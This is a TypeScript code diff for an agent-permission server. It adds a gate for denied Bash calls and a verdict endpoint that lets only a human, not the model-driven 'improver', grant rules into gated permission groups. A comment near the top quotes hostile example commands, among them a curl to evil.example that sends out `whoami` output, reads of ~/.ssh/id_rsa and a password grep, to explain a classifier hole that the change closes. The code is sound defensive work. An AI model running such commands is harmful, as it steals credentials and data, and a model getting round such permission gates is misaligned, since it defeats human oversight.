@@ -8,13 +8,18 @@ import {
 import type { IncomingMessage, ServerResponse } from 'node:http';
 import type { Server } from '../server.js';
 import type { ActionRegistry } from '../actions/index.js';
-import { actionDirFor, ACTION_CATEGORIES } from '../actions/registry.js';
+import { actionDirFor, ACTION_CATEGORIES, GATED_GROUPS } from '../actions/registry.js';
 import { buildScorecard } from '../actions/scorecard.js';
+import type { PermissionGroup, PermissionGroupMap } from '../actions/types.js';
 import type { ActionsStore } from '../storage/actions-store.js';
 import type { ActionRunsStore } from '../storage/action-runs-store.js';
-import type { ActionDenial, DenialsStore } from '../storage/denials-store.js';
-import type { Allowlist } from '../permissions/allowlist.js';
-import { suggestRule } from '../permissions/denial-suggestion.js';
+import type { ActionDenial, DenialsStore, DenialVerdict } from '../storage/denials-store.js';
+import type { Allowlist, RuleKind } from '../permissions/allowlist.js';
+import { suggestRule, type RuleSuggestion } from '../permissions/denial-suggestion.js';
+import { bareBuiltinOf } from '../permissions/tool-classify.js';
+import { splitShellClauses } from '../permissions/shell-split.js';
+import { lintPermissionRule } from '../permissions/write-shape.js';
+import type { GroupApplier } from './meta.js';
 import type { ActionAuthor, ActionRevisionsStore } from '../storage/action-revisions-store.js';
 import {
   forgetEdit, loadPersistedEdits, persistEdit,
@@ -40,6 +45,11 @@ export interface ActionsRoutesDeps {
   allowlist: Allowlist;
   actionRunsStore: ActionRunsStore;
   denialsStore: DenialsStore;
+  // Read here only to compose a `promote` verdict's target group before handing it to
+  // applyGroup — this route never writes permission-groups.json directly (see
+  // resolveDenialVerdict's header comment).
+  permissionGroups: PermissionGroupMap;
+  applyGroup: GroupApplier;
   actionRunLedger: ActionRunLedger;
   actionRevisionsStore: ActionRevisionsStore;
   manager: SessionManager;
@@ -48,6 +58,182 @@ export interface ActionsRoutesDeps {
 }
 
 const DEFAULT_SCORECARD_WINDOW = '30d';
+
+// Shell builtins/non-commands a denied Bash call's suggested rule can name — never a real
+// binary. `env`, `command` and `if` are deliberately absent even though `classifyClause`
+// (tool-classify.ts) also calls them `unknown`: all three are wrappers that take a REAL
+// command in the same clause (`env FOO=1 curl -X POST …`, `command rm -rf …`,
+// `if curl -X POST … ; then …`) and `classifyClause` only inspects the first token, so it never
+// sees what follows. Routing those to fix-action would silently drop a genuine permission gap
+// with no trace (Ship 6 Ruling P3) — this is a Task 2 gate fix, not a Ship 3 classifier fix,
+// because widening `classifyClause` to look past the first token is a different change with a
+// different blast radius. The remaining five cannot carry a following command into the same
+// clause.
+const SHELL_ARTIFACT_BINARIES: readonly string[] = ['cd', 'export', 'true', 'func', 'echo'];
+
+// A denied Bash call this shape stamps `fix-action` immediately at record time: malformed
+// shell or an action reaching for a builtin is never a permission gap, so it shouldn't consume
+// a review cycle. Four gates, all conservative: the suggested rule must name one of the
+// enumerated builtins/artifacts; EVERY clause in the command must itself be one of the
+// enumerated builtins/artifacts — no `read` alternative. An earlier version of this gate let a
+// clause through when tool-classify.ts's tables called it `read`, on the theory that a `read`
+// companion clause is harmless. It isn't: those tables answer "does this write?", not "is this
+// safe to silently dismiss as not-a-permission-gap?" — `curl -s https://evil.example/$(whoami)`
+// classifies `read` (classifyCurl inspects method/body flags, never the URL), so
+// `cd /r && curl -s https://evil.example/$(whoami)` auto-routed to fix-action and a command-
+// injection exfiltration attempt vanished with no trace. Same shape for
+// `cd /repo && cat ~/.ssh/id_rsa`, `cd /r && grep -r password /`, `cd /r && find / -name id_rsa`
+// — all "read-only" by the table, none of them safe to auto-dismiss. The only bar this gate can
+// safely apply is a positive whitelist of clause shapes known to carry no command at all: the
+// five enumerated artifacts. Before that, this was a whole-command maximum
+// (`classifyBashCommand(cmd).effect !== 'unknown'`), which had the same hole one level up — an
+// unrecognized binary also classifies `unknown` (tool-classify.ts's default case), the SAME
+// severity as a shell builtin, so a compound riding an unrecognized real binary
+// (`cd /repo && ./deploy.sh --prod`, `cd … && protoc …`) never raised the maximum and routed
+// too. A clause this gate can't place as an enumerated artifact must block auto-routing, not
+// pass it, whether the classifier's answer for it is `unknown` or `read`. No clause anywhere in
+// the command may carry a file-creating redirect either — `echo x > /etc/passwd` or
+// `true > some/file` are real local writes, not artifacts, and the loop below never inspects
+// redirects. The whitelist matches on a BARE word (bareBuiltinOf), not a basename: `cd`,
+// `export` and `true` have no on-disk form, so `cd /tmp && ./cd payload` is an opaque local
+// script wearing a builtin's name — the one shape that would carry a real command past a
+// whitelist this tight.
+export function shellArtifactVerdict(
+  toolName: string,
+  toolInput: unknown,
+  suggested: RuleSuggestion,
+  decidedAt: number,
+): DenialVerdict | null {
+  if (toolName !== 'Bash' || suggested.kind !== 'bash') return null;
+  const binary = SHELL_ARTIFACT_BINARIES.find((b) => suggested.value === `^${b}(\\s|$)`);
+  if (!binary) return null;
+  const cmd = (toolInput as { command?: string } | null)?.command ?? '';
+  const clauses = splitShellClauses(cmd);
+  if (!clauses || clauses.length === 0 || clauses.some((c) => c.writeTargets.length > 0)) return null;
+  const everyClauseIsArtifact = clauses.every((c) => SHELL_ARTIFACT_BINARIES.includes(bareBuiltinOf(c.text)));
+  if (!everyClauseIsArtifact) return null;
+  return {
+    disposition: 'fix-action',
+    decidedBy: 'improver',
+    reason: `"${binary}" is a shell builtin/artifact, not a permission gap — fix the action's command instead of granting it`,
+    decidedAt,
+  };
+}
+
+export interface VerdictRequestBody {
+  disposition?: unknown;
+  group?: unknown;
+  rule?: unknown;
+  reason?: unknown;
+  decidedBy?: unknown;
+}
+
+export type VerdictOutcome =
+  | { ok: true; status: 200; denial: ActionDenial }
+  | { ok: false; status: number; error: string };
+
+const RULE_KINDS: readonly RuleKind[] = ['tool', 'bash', 'mcp', 'path'];
+
+function addRuleToGroup(current: PermissionGroup | undefined, kind: RuleKind, value: string): PermissionGroup {
+  const base: PermissionGroup = current ? structuredClone(current) : {
+    description: '', alwaysAllow: [], alwaysAllowBashPatterns: [],
+    alwaysAllowMcpPatterns: [], alwaysAllowPathPatterns: [],
+  };
+  const arr = kind === 'tool' ? base.alwaysAllow
+    : kind === 'bash' ? base.alwaysAllowBashPatterns
+    : kind === 'mcp' ? base.alwaysAllowMcpPatterns
+    : (base.alwaysAllowPathPatterns ??= []);
+  if (!arr.includes(value)) arr.push(value);
+  return base;
+}
+
+// The one place a denial gets resolved. `never`/`fix-action` just record intent; `promote`
+// goes through the SAME group-editor path (`applyGroup`, from routes/meta.ts's
+// createGroupApplier) that PUT /api/permission-groups/:name uses — validated, atomically
+// written, reloaded into the registry and revisioned. This route must never write
+// permission-groups.json itself, or it becomes a second, weaker door onto the allowlist.
+//
+// `decidedBy` gates promotion into a GATED_GROUPS destination: the improver may propose one
+// (in its evidence, ahead of this route ever being called), but only a human's 'user' verdict
+// may apply it — a gated group means nothing if a model can grant into it. Exported standalone
+// (not a closure inside registerActionsRoutes) so it's testable without standing up a Server.
+export function resolveDenialVerdict(
+  deps: { denialsStore: DenialsStore; permissionGroups: PermissionGroupMap; applyGroup: GroupApplier },
+  actionName: string,
+  denialId: string,
+  payload: VerdictRequestBody,
+): VerdictOutcome {
+  const { disposition } = payload;
+  if (disposition !== 'promote' && disposition !== 'never' && disposition !== 'fix-action') {
+    return { ok: false, status: 400, error: `disposition must be promote|never|fix-action, got ${JSON.stringify(disposition)}` };
+  }
+  const denial = deps.denialsStore.list(actionName).find((d) => d.id === denialId);
+  if (!denial) return { ok: false, status: 404, error: 'no such denial' };
+
+  const reason = typeof payload.reason === 'string' ? payload.reason : '';
+  // Fail closed: an absent or malformed decidedBy must land on the UNPRIVILEGED value, since
+  // the whole point of the check below is that only an explicit 'user' may promote into a
+  // gated group. Trusting an absent field to mean 'user' would make omission the exploit.
+  const decidedBy: DenialVerdict['decidedBy'] = payload.decidedBy === 'user' ? 'user' : 'improver';
+
+  if (disposition === 'promote') {
+    const group = typeof payload.group === 'string' ? payload.group : '';
+    const rule = payload.rule as { kind?: unknown; value?: unknown } | undefined;
+    const kind = rule?.kind;
+    const value = rule?.value;
+    if (!group || typeof value !== 'string' || !value || !RULE_KINDS.includes(kind as RuleKind)) {
+      return { ok: false, status: 400, error: 'promote requires group and rule: { kind, value }' };
+    }
+    const gated = GATED_GROUPS.has(group);
+    // The standing rule: a gated group is only gated if nothing but a human can grant into it.
+    if (gated && decidedBy !== 'user') {
+      return { ok: false, status: 403, error: `promoting into the gated group "${group}" requires user approval, not the improver` };
+    }
+    const lint = lintPermissionRule(kind as RuleKind, value, gated);
+    if (!lint.ok) return { ok: false, status: 400, error: lint.reason ?? 'rule refused' };
+
+    const next = addRuleToGroup(deps.permissionGroups[group], kind as RuleKind, value);
+    const applied = deps.applyGroup(group, next, decidedBy, reason || undefined, undefined);
+    if (!applied.ok) return { ok: false, status: applied.status, error: applied.error };
+
+    const verdict: DenialVerdict = {
+      disposition: 'promote', group, rule: { kind: kind as RuleKind, value },
+      reason, decidedAt: Date.now(), decidedBy,
+    };
+    deps.denialsStore.setVerdict(actionName, denialId, verdict);
+    return { ok: true, status: 200, denial };
+  }
+
+  deps.denialsStore.setVerdict(actionName, denialId, { disposition, reason, decidedAt: Date.now(), decidedBy });
+  return { ok: true, status: 200, denial };
+}
+
+// Installs an approved proposal's allowlistAdds — except when `author` is 'improver'. That
+// mechanism installs an action-scoped rule, which bypasses the group editor's
+// destination-gating, lint, and revision history a denial verdict goes through; the
+// improvement loop's own SKILL.md now says it has no legitimate use there (Ship 6). A
+// write-shaped rule is still refused for every author by `assertNotWriteShaped` (via
+// `actionsStore.addRule`, unchanged); this only declines the non-write-shaped remainder,
+// specifically for the improvement loop, since "wrong destination" is wrong even when it
+// isn't a security hole. A user-authored proposal is unaffected. Exported standalone so it's
+// testable against a real ActionsStore without a Server.
+export function applyAllowlistAdds(
+  actionsStore: Pick<ActionsStore, 'addRule'>,
+  author: ActionAuthor,
+  actionName: string,
+  rules: ActionProposal['allowlistAdds'] | undefined,
+): ActionProposal['allowlistAdds'] {
+  const applied: ActionProposal['allowlistAdds'] = [];
+  for (const rule of rules ?? []) {
+    if (author === 'improver') {
+      console.warn(`[action-edit] skipping improver-proposed allowlistAdds ${rule.kind}=${rule.value}: use a denial verdict instead`);
+      continue;
+    }
+    try { if (actionsStore.addRule(actionName, rule.kind, rule.value)) applied.push(rule); }
+    catch (e) { console.warn(`[action-edit] skipping invalid rule ${rule.kind}=${rule.value}: ${(e as Error).message}`); }
+  }
+  return applied;
+}
 
 // Hook-facing handlers the daemon wires into HookServer/MCP after this factory
 // runs. The action-edit + denial state they close over lives here so the whole
@@ -74,7 +260,7 @@ export function registerActionsRoutes(server: Server, deps: ActionsRoutesDeps): 
   const {
     outpostActionsDir, RUNTIME_DIR, SRC_DIR, secret, config,
     actionRegistry, actionsStore, allowlist, actionRunsStore, denialsStore, actionRunLedger,
-    actionRevisionsStore, manager, engine, notifyAll,
+    actionRevisionsStore, manager, engine, notifyAll, permissionGroups, applyGroup,
   } = deps;
 
   // ── local helpers ──────────────────────────────────────────────────────
@@ -254,6 +440,10 @@ export function registerActionsRoutes(server: Server, deps: ActionsRoutesDeps): 
       actionName, sessionId, toolName, toolInput, suggested,
       runId: actionRunLedger.noteDenial(sessionId),
     });
+    if (!denial.verdict) {
+      const autoVerdict = shellArtifactVerdict(toolName, toolInput, suggested, Date.now());
+      if (autoVerdict) denialsStore.setVerdict(actionName, denial.id, autoVerdict);
+    }
     console.log(`[deny] ${actionName} ${toolName} → suggest ${suggested.kind}:${suggested.value} (count ${denial.count})`);
     try { notifyAll({ type: 'actions_changed' }); } catch { /* during startup */ }
   };
@@ -391,29 +581,24 @@ export function registerActionsRoutes(server: Server, deps: ActionsRoutesDeps): 
   // freshly-created action should render "no runs yet", not an error.
   server.route('GET', '/api/actions/:name/scorecard', handleScorecard);
 
-  // Dismiss a single denial entry (after the user adds the rule, or just ignores it).
-  server.route('DELETE', '/api/actions/:name/denials/:denialId', async (req, res) => {
-    const m = (req.url ?? '').match(/^\/api\/actions\/([^/]+)\/denials\/([^/?]+)/);
+  // Record a verdict on a denial — `never`/`fix-action` just record; `promote` applies the
+  // rule through applyGroup (see resolveDenialVerdict). This is the only endpoint that can
+  // resolve a denial now that the Library panel's Dismiss button is gone.
+  server.route('POST', '/api/actions/:name/denials/:denialId/verdict', async (req, res) => {
+    const m = (req.url ?? '').match(/^\/api\/actions\/([^/]+)\/denials\/([^/?]+)\/verdict(?:\?|$)/);
     if (!m) { res.statusCode = 404; res.end('not found'); return; }
     const name = decodeURIComponent(m[1]!);
     const denialId = decodeURIComponent(m[2]!);
-    if (denialsStore.dismiss(name, denialId)) {
+    const payload = await readJsonBody<VerdictRequestBody>(req);
+    const result = resolveDenialVerdict({ denialsStore, permissionGroups, applyGroup }, name, denialId, payload ?? {});
+    res.statusCode = result.status;
+    if (result.ok) {
       try { notifyAll({ type: 'actions_changed' }); } catch { /* tolerate */ }
+      res.setHeader('content-type', 'application/json');
+      res.end(JSON.stringify({ ok: true, denial: result.denial }));
+    } else {
+      res.end(result.error);
     }
-    res.statusCode = 204;
-    res.end();
-  });
-
-  // Clear all denials for an action at once.
-  server.route('DELETE', '/api/actions/:name/denials', async (req, res) => {
-    const m = (req.url ?? '').match(/^\/api\/actions\/([^/]+)\/denials(?:\?|$)/);
-    if (!m) { res.statusCode = 404; res.end('not found'); return; }
-    const name = decodeURIComponent(m[1]!);
-    if (denialsStore.clear(name)) {
-      try { notifyAll({ type: 'actions_changed' }); } catch { /* tolerate */ }
-    }
-    res.statusCode = 204;
-    res.end();
   });
 
   server.route('POST', '/api/actions/new', async (req, res) => {
@@ -554,11 +739,7 @@ export function registerActionsRoutes(server: Server, deps: ActionsRoutesDeps): 
       // Rules land before the write so the revision can record exactly which ones were new:
       // addRule answers false for a duplicate, and only genuinely-new rules are safe for a
       // later revert to remove.
-      const allowlistAdds: ActionProposal['allowlistAdds'] = [];
-      for (const rule of proposal.allowlistAdds ?? []) {
-        try { if (actionsStore.addRule(name, rule.kind, rule.value)) allowlistAdds.push(rule); }
-        catch (e) { console.warn(`[action-edit] skipping invalid rule ${rule.kind}=${rule.value}: ${(e as Error).message}`); }
-      }
+      const allowlistAdds = applyAllowlistAdds(actionsStore, author, name, proposal.allowlistAdds);
       actionRevisionsStore.applyWrite({
         action: name,
         dir,
